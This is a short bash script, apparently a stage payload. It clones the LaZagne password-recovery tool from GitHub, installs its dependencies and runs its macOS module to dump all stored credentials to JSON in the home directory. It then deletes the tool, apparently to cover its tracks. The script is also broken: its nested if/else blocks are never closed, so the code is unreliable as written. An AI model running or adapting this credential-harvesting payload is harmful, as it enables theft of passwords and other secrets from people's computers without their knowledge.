#!/bin/bash

# check for quite running...

payload() {
    printf "\033[33m[*]\033[0m Preparing payload..."
    if ! git --version; then
        printf "\033[31m[*]\033[0m Git not installed."
        exit 1
    else
        if ! pip3 --version; then
            printf "\033[31m[*]\033[0m Pip3 not installed."
            exit 1
        else
            printf "\033[33m[*]\033[0m Downloading LaZagne..."
            cd # home
            if ! git clone https://github.com/AlessandroZ/LaZagne; then
                printf "\033[31m[*]\033[0m Unable to download LaZagne."
                exit 1
            else
                printf "\033[33m[*]\033[0m Preparing to run scripts..."
                pip3 install -r LaZagne/requirements.txt
                printf "\033[33m[*]\033[0m Running scripts..."
                python3 LaZagne/Mac/laZagne.py all -oJ -output # home
                printf "\033[33m[*]\033[0m Removing files..."
                rm -rf LaZagne
                printf "\033[32m[*]\033[0m Done."
                exit 0
}


payload
